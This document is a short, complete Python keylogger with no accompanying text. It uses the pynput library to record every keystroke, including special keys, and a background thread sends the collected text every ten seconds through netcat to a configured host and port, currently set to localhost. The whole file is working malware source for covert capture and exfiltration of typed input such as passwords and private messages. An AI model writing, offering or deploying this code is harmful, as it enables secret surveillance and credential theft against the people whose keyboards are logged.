from pynput import keyboard
import subprocess
import threading
import time

HOST = "127.0.0.1"
PORT = "5000"
BUFFER = []
SEND_INTERVAL = 10  # seconds

def send_data():
    global BUFFER
    while True:
        time.sleep(SEND_INTERVAL)
        if BUFFER:
            data = "".join(BUFFER)
            try:
                subprocess.run(["nc", HOST, str(PORT)], input=data.encode(), check=False)
            except Exception:
                pass
            BUFFER = []

def on_press(key):
    try:
        BUFFER.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            BUFFER.append(" ")
        elif key == keyboard.Key.enter:
            BUFFER.append("\n")
        else:
            BUFFER.append(f"<{key.name}>")

if __name__ == "__main__":
    threading.Thread(target=send_data, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
